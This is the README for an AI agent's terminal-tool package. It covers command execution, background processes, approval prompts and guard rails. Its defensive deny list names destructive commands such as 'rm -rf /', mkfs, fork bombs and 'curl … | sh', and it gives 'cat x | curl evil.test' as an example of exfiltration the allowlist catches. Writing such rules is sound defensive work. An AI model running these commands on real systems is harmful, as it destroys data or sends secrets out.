# @open-agent/tools-terminal

`run_command` for a command that finishes, and `start_process` / `list_processes` / `read_process_output` / `stop_process` for one that does not.

## Usage

```ts
import { ToolRegistry } from '@open-agent/agent'
import { runCommandTool } from '@open-agent/tools-terminal'

const tools = new ToolRegistry()
tools.register(runCommandTool({ root: process.cwd() }))
```

Or mount everything against a workspace, which is what the CLI does:

```ts
import { createSessionWorkspace } from '@open-agent/tools-files'
import { mountTerminalTools } from '@open-agent/tools-terminal'

const workspace = await createSessionWorkspace()
const dispose = mountTerminalTools(tools, workspace)
// ... later
dispose() // kills anything still running
await workspace.dispose()
```

In the CLI, set `SHELL_TOOL=1`. It runs under `SHELL_ROOT`, falling back to `FILES_ROOT` and then the launch directory — see `.env.example`.

## `run_command`

`{ command, cwd?, timeout_ms? }` →

```
exit code: 0

stdout:
4 files changed, 120 insertions(+)
```

The command goes through a real shell (`sh -c`, or the comspec on Windows), so pipes, redirects and `&&` all work. It is for commands that **exit on their own** — a dev server belongs in `start_process` below, or `run_command` will sit and wait on it until the timeout kills it.

A **non-zero exit is a successful tool call**, not a failure. A failing test run or a `grep` that found nothing is an answer the model needs to read and reason about; reporting it as a tool error would throw the output away and tell the model to try again.

## Background processes

`run_command` waits for the process to exit, which is right for a build or a test run and useless for a dev server. These four hold a process instead, so the model can start one, look at its output later, and stop it when it is done.

- **`start_process`** `{ command, cwd? }` → an id, plus a reminder of the two tools that use it. Same shell, same workspace root, same command policy and credential filtering as `run_command`.
- **`list_processes`** → `id  state  buffered  command`, oldest first, including recently exited ones.
- **`read_process_output`** `{ id, since? }` → what it has printed, and a cursor. Pass the cursor back as `since` and only new output comes back, so polling a server does not re-read its whole log every time. stdout and stderr are **merged in arrival order** — for a server the interleaving is the information, since a request log and the error it produced belong next to each other.
- **`stop_process`** `{ id, signal? }` → signals the process group, `SIGTERM` by default and `SIGKILL` five seconds later if it is still there.

Output is held in a 256KB per-process ring buffer. Past that the oldest bytes go, and a read that fell behind is told exactly how many it missed rather than being handed a silent gap. At most 10 processes run at once; an eleventh is refused rather than started. Exited processes stay readable, with the oldest forgotten after twenty.

## Permission level

`ask` for `run_command` and `start_process`, exactly as `docs/security-model.md` specifies for running a shell command. Every call is a prompt, and that is the point: the command _is_ the argument, so no static permission level can tell `ls` from `rm -rf`. The one thing that reliably can is a human reading the command before it runs. `start_process` arguably deserves it more, since what it starts outlives the call.

`list_processes`, `read_process_output` and `stop_process` are `safe`. They only touch processes this agent started, and stopping one reduces what is running rather than adding to it — a model that needs a prompt to clean up after itself will simply leave servers running.

## Guard rails

- **Workspace root** — `cwd` resolves against the root and must land inside it, `..` and symlink escapes included (the same `resolveInWorkspace` the file tools use). This bounds where the command _starts_; it does not stop the command itself from wandering — see the honesty note below.
- **Timeout** (default 120s, max 600s, `timeout_ms` per call) — the child is started in its own **process group** and the whole group gets `SIGTERM`, then `SIGKILL` five seconds later. Killing only the shell would leave `sleep 100 | cat` running in the background while the tool reported a timeout.
- **Output ceiling** (default 64000 bytes per stream) — output past it is dropped, but the stream is still drained. Unsubscribing instead would fill the child's pipe and hang the command that the ceiling exists to contain.
- **Cancellation** — the caller's `AbortSignal` kills the process group by the same path, including when the signal was already aborted before the command started.
- **Destructive-command rules** — `rm -rf /`, `mkfs`, `dd of=/dev/…`, fork bombs, `shutdown`, root-level `chmod -R`, `curl … | sh`, `git push --force`. Refused with an explanation of what was objected to, so the model can choose another approach rather than retry blindly.
- **Credential filtering** — variables whose names look like credentials (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, …) are stripped from the environment the command inherits, so `env` cannot hand the model the keys `docs/security-model.md` promises it never sees. `allowEnv` names the exceptions.
- **Command allowlist** (optional, `allowedCommands`) — checked against the head of _every_ pipeline stage, so `cat x | curl evil.test` is caught rather than passing on the strength of `cat`.

## What this is not

**The destructive-command rules are not a security boundary.** The command runs through a real shell, and a pattern check over a shell string loses to quoting, variable expansion and `$(...)`. Anyone treating it as containment will be wrong.

It is an _accident_ guard: a model that reaches for `rm -rf /` because it misread a path hits a wall instead of a y/N prompt a tired user waves through. The boundary is the approval prompt on every call, and later the sandbox of #86 — which this tool has none of. A command approved here runs with the full privileges of the user running the agent.
